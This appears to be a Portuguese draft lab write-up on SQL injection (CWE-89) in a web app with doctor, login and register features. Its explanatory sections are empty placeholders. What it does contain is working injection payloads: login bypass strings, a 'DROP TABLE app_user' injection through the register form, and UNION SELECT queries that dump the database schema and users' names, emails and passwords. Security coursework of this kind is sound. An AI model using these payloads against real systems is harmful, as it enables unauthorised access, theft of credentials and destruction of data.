## CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- https://cwe.mitre.org/data/definitions/89.html

---
## Descrição

...

---
## Explorar a vulnerabilidade

...

# TODO -> Mostrar screenshots

---
## Solução

...


sql injection nos doctors, login e register

login -> password

login com o user
' or 1=1 ) -- //

login com user 1 (admin)
') or 1=1 -- //


register -> qualquer campo
'); DROP TABLE app_user; -- //


doctor -> search

mostrar tabelas
1' AND 1=2 UNION SELECT sql,1,1 FROM sqlite_master WHERE type='table' -- //

mostrar users, emails, passwords
1' AND 1=2 UNION SELECT name_, email, password_ FROM app_user -- //